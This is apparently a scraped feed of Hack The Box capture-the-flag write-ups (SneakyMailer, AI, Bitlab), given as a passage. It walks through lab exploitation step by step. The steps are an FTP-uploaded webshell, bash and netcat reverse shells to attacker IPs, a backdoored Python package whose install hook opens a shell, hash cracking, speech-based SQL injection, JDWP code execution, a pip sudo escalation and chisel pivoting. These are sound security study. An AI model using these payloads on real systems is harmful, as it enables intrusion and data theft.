(|||34566|) 150 Here comes the directory listing. drwxrwxr-x 8 0 1001 4096 Jun 30 2020 dev 226 Directory send OK. ftp\u0026gt; cd dev 250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||7536|) 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 May 26 2020 css drwxr-xr-x 2 0 0 4096 May 26 2020 img -rwxr-xr-x 1 0 0 13742 Jun 23 2020 index.php drwxr-xr-x 3 0 0 4096 May 26 2020 js drwxr-xr-x 2 0 0 4096 May 26 2020 pypi drwxr-xr-x 4 0 0 4096 May 26 2020 scss -rwxr-xr-x 1 0 0 26523 May 26 2020 team.php drwxr-xr-x 8 0 0 4096 May 26 2020 vendor 226 Directory send OK. Let\u0026rsquo;s try putting webshell there ftp\u0026gt; put shell.php shell.php local: Documents/Tools/shell.php remote: shell.php 229 Entering Extended Passive Mode (|||17517|) 150 Ok to send data. 100% |***********************************************************************************************************************************************************************************************| 35 3.86 KiB/s 00:00 ETA 226 Transfer complete. 35 bytes sent in 00:00 (0.06 KiB/s) ftp\u0026gt; And we have our webshell └─$ curl -s http://dev.sneakycorp.htb/shell.php --data-urlencode \u0026#34;cmd=id\u0026#34; uid=33(www-data) gid=33(www-data) groups=33(www-data) Let\u0026rsquo;s get reverse shell └─$ curl -s http://dev.sneakycorp.htb/shell.php --data-urlencode \u0026#34;cmd=bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; User paul had second message later, regarding python modules Let\u0026rsquo;s find a process mentioned www-data@sneakymailer:~$ ps auxww | grep python pypi 750 0.0 0.6 36804 25772 ? Ss 12:30 0:02 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages low 1092 0.0 0.5 29952 20864 ? Ss 12:30 0:02 /home/low/venv/bin/python /opt/scripts/low/install-modules.py www-data 3011 0.0 0.2 17048 8352 ? S 13:14 0:00 python3 -c import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;) www-data 3316 0.0 0.0 6408 884 pts/0 S+ 13:21 0:00 grep python I\u0026rsquo;ll download .htpasswd and run hashcat www-data@sneakymailer:~$ cat /var/www/pypi.sneakycorp.htb/.htpasswd pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/ └─$ hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt --user hashcat (v6.2.6) starting \u0026lt;SNIP\u0026gt; $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui \u0026lt;SNIP\u0026gt; We have nginx configs with another pypi subdomain www-data@sneakymailer:/etc/nginx$ ls -lha sites-enabled/ total 8.0K drwxr-xr-x 2 root root 4.0K May 26 2020 . drwxr-xr-x 8 root root 4.0K May 14 2020 .. lrwxrwxrwx 1 root root 46 May 14 2020 pypi.sneakycorp.htb -\u0026gt; /etc/nginx/sites-available/pypi.sneakycorp.htb lrwxrwxrwx 1 root root 41 May 14 2020 sneakycorp.htb -\u0026gt; /etc/nginx/sites-available/sneakycorp.htb www-data@sneakymailer:/etc/nginx$ cat sites-enabled/pypi.sneakycorp.htb server { listen 0.0.0.0:8080 default_server; listen [::]:8080 default_server; server_name _; } server { listen 0.0.0.0:8080; listen [::]:8080; server_name pypi.sneakycorp.htb; location / { proxy_pass http://127.0.0.1:5000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; } } I\u0026rsquo;ll add new subdomain to /etc/hosts We will create a malicious module https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/ https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ Template structure Empty files: README.md, setup.cfg www-data@sneakymailer:/dev/shm/revshell$ ls -lha * -rw-r--r-- 1 www-data www-data 0 Oct 31 13:53 README.md -rw-r--r-- 1 www-data www-data 0 Oct 31 13:52 setup.cfg -rw-r--r-- 1 www-data www-data 0 Oct 31 13:52 setup.py revshell: total 0 drwxr-xr-x 2 www-data www-data 60 Oct 31 13:52 . drwxr-xr-x 3 www-data www-data 120 Oct 31 13:53 .. -rw-r--r-- 1 www-data www-data 0 Oct 31 13:52 __init__.py setup.py import os import socket import subprocess from setuptools import setup, find_packages from setuptools.command.install import install from setuptools.command.egg_info import egg_info def RunCommand(): s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.16.4\u0026#34;,443)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) class RunInstallCommand(install): def run(self): RunCommand() install.run(self) setup( name = \u0026#34;revshell\u0026#34;, version = \u0026#34;0.0.1\u0026#34;, license = \u0026#34;MIT\u0026#34;, packages=find_packages(), cmdclass={ \u0026#39;install\u0026#39; : RunInstallCommand }, ) Create a source distribution https://www.geeksforgeeks.org/source-distribution-and-built-distribution-in-python/ └─$ python2.7 setup.py sdist running sdist running egg_info creating revshell.egg-info writing revshell.egg-info/PKG-INFO writing top-level names to revshell.egg-info/top_level.txt writing dependency_links to revshell.egg-info/dependency_links.txt writing manifest file \u0026#39;revshell.egg-info/SOURCES.txt\u0026#39; reading manifest file \u0026#39;revshell.egg-info/SOURCES.txt\u0026#39; writing manifest file \u0026#39;revshell.egg-info/SOURCES.txt\u0026#39; running check warning: check: missing required meta-data: url warning: check: missing meta-data: either (author and author_email) or (maintainer and maintainer_email) must be supplied creating revshell-0.0.1 creating revshell-0.0.1/revshell creating revshell-0.0.1/revshell.egg-info copying files to revshell-0.0.1... copying README.md -\u0026gt; revshell-0.0.1 copying setup.cfg -\u0026gt; revshell-0.0.1 copying setup.py -\u0026gt; revshell-0.0.1 copying revshell/__init__.py -\u0026gt; revshell-0.0.1/revshell copying revshell.egg-info/PKG-INFO -\u0026gt; revshell-0.0.1/revshell.egg-info copying revshell.egg-info/SOURCES.txt -\u0026gt; revshell-0.0.1/revshell.egg-info copying revshell.egg-info/dependency_links.txt -\u0026gt; revshell-0.0.1/revshell.egg-info copying revshell.egg-info/top_level.txt -\u0026gt; revshell-0.0.1/revshell.egg-info Writing revshell-0.0.1/setup.cfg creating dist Creating tar archive removing \u0026#39;revshell-0.0.1\u0026#39; (and everything under it) └─$ ls -lha dist total 12K drwxr-xr-x 2 kali kali 4.0K Oct 31 18:06 . drwxr-xr-x 5 kali kali 4.0K Oct 31 18:06 .. -rw-r--r-- 1 kali kali 953 Oct 31 18:06 revshell-0.0.1.tar.gz Now we create ~/.pypirc https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/#upload-remotely-using-setuptools [distutils] index-servers = sneaky [sneaky] repository: http://pypi.sneakycorp.htb:8080 username: pypi password: soufianeelhaoui Upload to the server └─$ python2.7 setup.py sdist upload -r sneaky running sdist running egg_info writing revshell.egg-info/PKG-INFO writing top-level names to revshell.egg-info/top_level.txt writing dependency_links to revshell.egg-info/dependency_links.txt reading manifest file \u0026#39;revshell.egg-info/SOURCES.txt\u0026#39; writing manifest file \u0026#39;revshell.egg-info/SOURCES.txt\u0026#39; running check warning: check: missing required meta-data: url warning: check: missing meta-data: either (author and author_email) or (maintainer and maintainer_email) must be supplied creating revshell-0.0.1 creating revshell-0.0.1/revshell creating revshell-0.0.1/revshell.egg-info copying files to revshell-0.0.1... copying README.md -\u0026gt; revshell-0.0.1 copying setup.cfg -\u0026gt; revshell-0.0.1 copying setup.py -\u0026gt; revshell-0.0.1 copying revshell/__init__.py -\u0026gt; revshell-0.0.1/revshell copying revshell.egg-info/PKG-INFO -\u0026gt; revshell-0.0.1/revshell.egg-info copying revshell.egg-info/SOURCES.txt -\u0026gt; revshell-0.0.1/revshell.egg-info copying revshell.egg-info/dependency_links.txt -\u0026gt; revshell-0.0.1/revshell.egg-info copying revshell.egg-info/top_level.txt -\u0026gt; revshell-0.0.1/revshell.egg-info Writing revshell-0.0.1/setup.cfg Creating tar archive removing \u0026#39;revshell-0.0.1\u0026#39; (and everything under it) running upload Submitting dist/revshell-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080 Server response (200): OK And we receive our revshell └─$ nc -lvnp 443 listening on [any] 443 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.197] 42162 low@sneakymailer:/$ id id uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg) low@sneakymailer:/$ Root sudo low@sneakymailer:/$ sudo -l sudo: unable to resolve host sneakymailer: Temporary failure in name resolution Matching Defaults entries for low on sneakymailer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User low may run the following commands on sneakymailer: (root) NOPASSWD: /usr/bin/pip3 GTFOBins Simply follow the same steps low@sneakymailer:/dev/shm$ TF=$(mktemp -d) low@sneakymailer:/dev/shm$ echo \u0026#34;import os; os.execl(\u0026#39;/bin/sh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sh \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\u0026#39;)\u0026#34; \u0026gt; $TF/setup.py low@sneakymailer:/dev/shm$ sudo /usr/bin/pip3 install $TF sudo: unable to resolve host sneakymailer: Temporary failure in name resolution Processing /tmp/tmp.Xhq8u5Nvjh # id uid=0(root) gid=0(root) groups=0(root) ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sneakymailer/images/sneakymailer.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sneakymailer/","summary":"SneakyMailer Enumeration nmap └─$ nmap -Pn -p- 10.10.10.197 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 17:04 GMT Warning: 10.10.10.197 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.197 (10.10.10.197) Host is up (0.17s latency). Not shown: 43759 filtered tcp ports (no-response), 21769 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 25/tcp open smtp 80/tcp open http 143/tcp open imap 993/tcp open imaps 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 119.","tags":["HTB","wfuzz","vhosts","phishing","swaks","imap","smtp","evolution","webshell","php","pypi","hashcat","htpasswd","setup-py","sudo","pip","gtfobins"],"title":"[HTB] Machine: SneakyMailer"},{"categories":null,"contents":"Time Enumeration nmap ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/time/images/time.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/time/","summary":"Time Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: Time"},{"categories":null,"contents":"AI Enumeration nmap └─$ nmap -Pn -p- 10.10.10.163 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 19:19 BST Nmap scan report for 10.10.10.163 (10.10.10.163) Host is up (0.18s latency). Not shown: 65443 filtered tcp ports (no-response), 90 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 24.11 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.163 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 19:29 BST Nmap scan report for 10.10.10.163 (10.10.10.163) Host is up (0.77s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA) | 256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA) |_ 256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Hello AI! Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.03 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.10.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 50 -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.163/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /.php (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.163/images/] /contact.php (Status: 200) [Size: 37371] /index.php (Status: 200) [Size: 37347] /about.php (Status: 200) [Size: 37503] /uploads (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.163/uploads/] /db.php (Status: 200) [Size: 0] /intelligence.php (Status: 200) [Size: 38674] /ai.php (Status: 200) [Size: 37569] Foothold uploads and images return 403 about.php returns description intelligence.php and ai.php look interesting So we can upload a wav which will be interpreted by their AI api I can use https://www.text2speech.org/ to generate voice queries I set voice to US Male according to a note in intelligence.php I received no results for my query Since we have a query, let\u0026rsquo;s send special chars to see if something happens I\u0026rsquo;ll generate a wav with open single quote speech And I receive a SQL error The potential attack path is to generate sql injection speech We can now script the process using flite apt install flite └─$ flite -w speech.wav -voice rms -t \u0026#34;Hello\u0026#34; └─$ curl -s -X POST http://10.10.10.163/ai.php -F \u0026#39;fileToUpload=@speech.wav;type=audio/x-wav\u0026#39; -F \u0026#39;submit=Process It!\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; ... └─$ curl -s -X POST http://10.10.10.163/ai.php -F \u0026#39;fileToUpload=@speech.wav;type=audio/x-wav\u0026#39; -F \u0026#39;submit=Process It!\u0026#39; | grep \u0026#39;Query result :\u0026#39; | sed \u0026#39;s/\u0026lt;br \\/\u0026gt;/\\n/g\u0026#39; | sed \u0026#39;s/\u0026lt;h3\u0026gt;//g\u0026#39; Our understanding of your input is : hello Query result : Let\u0026rsquo;s make a script #!/bin/bash flite -w speech.wav -voice rms -t \u0026#34;$1\u0026#34; resp=$(curl -s -X POST http://10.10.10.163/ai.php -F \u0026#39;fileToUpload=@speech.wav;type=audio/x-wav\u0026#39; -F \u0026#39;submit=Process It!\u0026#39; | grep \u0026#39;Query result :\u0026#39; | sed \u0026#39;s/\u0026lt;br \\/\u0026gt;/\\n/g\u0026#39; | sed \u0026#39;s/\u0026lt;h3\u0026gt;//g\u0026#39;) echo -e \u0026#34;$resp\u0026#34; └─$ ./ai.sh \u0026#34;hello\u0026#34; Our understanding of your input is : hello Query result : Now let\u0026rsquo;s try to perform sqli We saw a hint from intelligence.php about Comment Database which will result in -- - We can perform basic injection and dump version └─$ ./ai.sh \u0026#34;open single quote space union select version open parenthesis close parenthesis comment database\u0026#34; Our understanding of your input is : \u0026#39; union select version()-- - Query result : 5.7.27-0ubuntu0.18.04.1 It\u0026rsquo;s really difficult to generate complicated sqli speech requests, so we should stick to basic queries We could assume that there\u0026rsquo;s a users database If we try to dump it, we have a hit └─$ ./ai.sh \u0026#34;open single quote space union select space username space from users comment database\u0026#34; Our understanding of your input is : \u0026#39; union select username from users -- - Query result : alexa └─$ ./ai.sh \u0026#34;open single quote space union select space password space from users comment database\u0026#34; Our understanding of your input is : \u0026#39; union select password from users -- - Query result : H,Sq9t6}a\u0026lt;)?q93_ We can ssh └─$ sshpass -p \u0026#39;H,Sq9t6}a\u0026lt;)?q93_\u0026#39; ssh alexa@10.10.10.163 Warning: Permanently added \u0026#39;10.10.10.163\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Oct 26 15:07:09 UTC 2023 System load: 0.03 Processes: 145 Usage of /: 72.5% of 4.79GB Users logged in: 0 Memory usage: 29% IP address for eth0: 10.10.10.163 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 63 packages can be updated. 15 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Oct 24 15:04:38 2019 from 192.168.0.104 alexa@AI:~$ Root Nothing interesting in sudo and other directories But netstat shows other ports alexa@AI:~$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp6 0 0 127.0.0.1:8009 :::* LISTEN - tcp6 0 0 127.0.0.1:8080 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 0.0.0.0:5353 0.0.0.0:* - udp 0 0 0.0.0.0:58072 0.0.0.0:* - udp6 0 0 :::5353 :::* - udp6 0 0 :::42345 :::* - 3306 is database 8000 and 8080 is tomcat running as root alexa@AI:~$ ps auxww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.4 225172 8740 ? Ss Oct25 0:06 /sbin/init auto automatic-ubiquity noprompt ... root 55849 0.0 0.0 0 0 ? I 15:09 0:00 [kworker/0:1-eve] root 56126 3.2 5.1 3108796 102548 ? Sl 15:18 0:03 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start -agentlib:jdwp=transport=dt_socket,address=localhost:8000 option indicates that debug mode is enabled and on port 8000 We can configure port forwarding sshpass -p 'H,Sq9t6}a\u0026lt;)?q93_' ssh alexa@10.10.10.163 -L 8000:localhost:8000 We can use jdwp-shellifier https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol First I create rev.sh on target box #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.3/6666 0\u0026gt;\u0026amp;1 Then we execute jdwp-shellifier But it my case it didn\u0026rsquo;t work └─$ python2.7 ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd \u0026#39;/tmp/rev.sh\u0026#39; [+] Targeting \u0026#39;127.0.0.1:8000\u0026#39; [+] Reading settings for \u0026#39;OpenJDK 64-Bit Server VM - 11.0.4\u0026#39; [+] Found Runtime class: id=aa0 [+] Found Runtime.getRuntime(): id=7fea50023ae0 [+] Created break event id=2 [+] Waiting for an event on \u0026#39;java.net.ServerSocket.accept\u0026#39; [-] Exception: unpack requires a string argument of length 11 So let\u0026rsquo;s do it manually https://dl.packetstormsecurity.net/1307-exploits/JDWP-exploitation.txt https://notes.qazeer.io/l7/methodology-20 └─$ jdb -attach 8000 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Set uncaught java.lang.Throwable Set deferred uncaught java.lang.Throwable Initializing jdb ... \u0026gt; \u0026gt; classes ** classes list ** sun.reflect.annotation.AnnotationParser$$Lambda$97.677120200 ... java.lang.Runtime ... \u0026gt; methods java.lang.Runtime ** methods list ** ... java.lang.Runtime exec(java.lang.String[]) ... Then we trace methods \u0026gt; trace go methods Method entered: \u0026gt; \u0026#34;thread=http-nio-127.0.0.1-8080-BlockPoller\u0026#34;, org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events(), line=280 bci=0 Method entered: \u0026#34;thread=http-nio-127.0.0.1-8080-BlockPoller\u0026#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0 Method entered: \u0026#34;thread=ajp-nio-127.0.0.1-8009-BlockPoller\u0026#34;, org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events(), line=280 bci=0 Method entered: \u0026#34;thread=ajp-nio-127.0.0.1-8009-BlockPoller\u0026#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0 Method entered: \u0026#34;thread=http-nio-127.0.0.1-8080-BlockPoller\u0026#34;, org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events(), line=280 bci=0 Method entered: \u0026#34;thread=http-nio-127.0.0.1-8080-BlockPoller\u0026#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0 Method exited: return value = 0, \u0026#34;thread=http-nio-127.0.0.1-8080-BlockPoller\u0026#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=97 bci=22 ... We then set a breakpoint on method: stop in org.apache.tomcat.util.collections.SynchronizedQueue.size() Then when we hit a breakpoint, send print new java.lang.Runtime().exec(\u0026quot;/tmp/rev.sh\u0026quot;) └─$ jdb -attach 8000 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Set uncaught java.lang.Throwable Set deferred uncaught java.lang.Throwable Initializing jdb ... \u0026gt; stop in org.apache.tomcat.util.collections.SynchronizedQueue.size() Set breakpoint org.apache.tomcat.util.collections.SynchronizedQueue.size() \u0026gt; Breakpoint hit: \u0026#34;thread=ajp-nio-127.0.0.1-8009-BlockPoller\u0026#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0 ajp-nio-127.0.0.1-8009-BlockPoller[1] print new java.lang.Runtime().exec(\u0026#34;/tmp/rev.sh\u0026#34;) ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/ai/images/ai.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/ai/","summary":"AI Enumeration nmap └─$ nmap -Pn -p- 10.10.10.163 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 19:19 BST Nmap scan report for 10.10.10.163 (10.10.10.163) Host is up (0.18s latency). Not shown: 65443 filtered tcp ports (no-response), 90 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 24.11 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.","tags":["HTB"],"title":"[HTB] Machine: AI"},{"categories":null,"contents":"Bitlab Enumeration nmap └─$ nmap -Pn -p- 10.10.10.114 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 18:31 BST Nmap scan report for 10.10.10.114 (10.10.10.114) Host is up (0.27s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 127.78 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.114 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 18:33 BST Nmap scan report for 10.10.10.114 (10.10.10.114) Host is up (0.34s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit |_http-trane-info: Problem with XML parsing of /evox/about | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.114/users/sign_in Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds Web server Foothold If we click help we get the following page If we click Gitlab Login we receive javascript:(function(){ var _0x4b18=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x63\\x6C\\x61\\x76\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\u0026#34;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })() I used https://obf-io.deobfuscate.io/ to deobfuscate clave:11des0081x Using those creds, we can login We find snippets with creds Save them for later We see 2 repos Profile And Deployer deployer git pulls the updates for the profile Let\u0026rsquo;s add something to master branch and deploy it We have to merge our branch to master Now we see merging window Check Remove source branch to clean up after merge Click Merge And now visit profile page http://10.10.10.114/profile/?cmd=id We have a webshell Rev shell payload from https://www.revshells.com/ url-encoded: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.3 6666 \u0026gt;/tmp/f User If we run ip a, we docker network interface ps auxww shows multiple docker containers running ... root 1677 0.0 0.0 405508 1996 ? Sl 17:01 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.19.0.2 -container-port 80 root 1703 0.0 0.1 479240 2068 ? Sl 17:01 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5432 -container-ip 172.19.0.3 -container-port 5432 root 1725 0.0 0.1 479240 2104 ? Sl 17:01 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 3000 -container-ip 172.19.0.5 -container-port 80 ... nmap is installed We can scan the subnet www-data@bitlab:/var/www/html/profile$ nmap 172.19.0.0/24 Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-26 17:41 UTC Nmap scan report for bitlab (172.19.0.1) Host is up (0.00036s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8000/tcp open http-alt Nmap scan report for 172.19.0.2 Host is up (0.00039s latency). Not shown: 999 closed ports PORT STATE SERVICE 80/tcp open http Nmap scan report for 172.19.0.3 Host is up (0.00038s latency). Not shown: 999 closed ports PORT STATE SERVICE 5432/tcp open postgresql Nmap scan report for 172.19.0.4 Host is up (0.00040s latency). All 1000 scanned ports on 172.19.0.4 are closed Nmap scan report for 172.19.0.5 Host is up (0.00039s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8181/tcp open intermapper Nmap done: 256 IP addresses (5 hosts up) scanned in 3.15 seconds We have a postgres But box doesn\u0026rsquo;t have psql installed We have to configure port forwarding We can use chisel or ligolo-ng For ligolo-ng check: https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740 https://blog.wathix.xyz/zephyr-pro-lab-guide/pivoting#triple-pivot-with-sshuttle-and-ligolo-ng I\u0026rsquo;ll upload chisel Start chisel server on attack box └─$ ./chisel server -p 9001 --reverse 2023/10/26 18:50:17 server: Reverse tunnelling enabled 2023/10/26 18:50:17 server: Fingerprint Gu6w6goHmB652+x3Ji7X2k1dFSXWyWuhIWmRRJYVpO8= 2023/10/26 18:50:17 server: Listening on http://0.0.0.0:9001 Then connect from box www-data@bitlab:/tmp$ ./chisel client 10.10.16.3:9001 R:5432:localhost:5432 We will see the log that session was created 2023/10/26 18:52:01 server: session#1: tun: proxy#R:5432=\u0026gt;localhost:5432: Listening Connect via psql └─$ psql -h 127.0.0.1 -U profiles -p 5432 Password for user profiles: psql (16.0 (Debian 16.0-2), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. profiles=\u0026gt; Let\u0026rsquo;s enumerate profiles=\u0026gt; \\l List of databases Name | Owner | Encoding | Locale Provider | Collate | Ctype | ICU Locale | ICU Rules | Access privileges -----------+----------+----------+-----------------+---------+-------+------------+-----------+----------------------- gitlab | postgres | UTF8 | libc | C | C | | | =Tc/postgres + | | | | | | | | 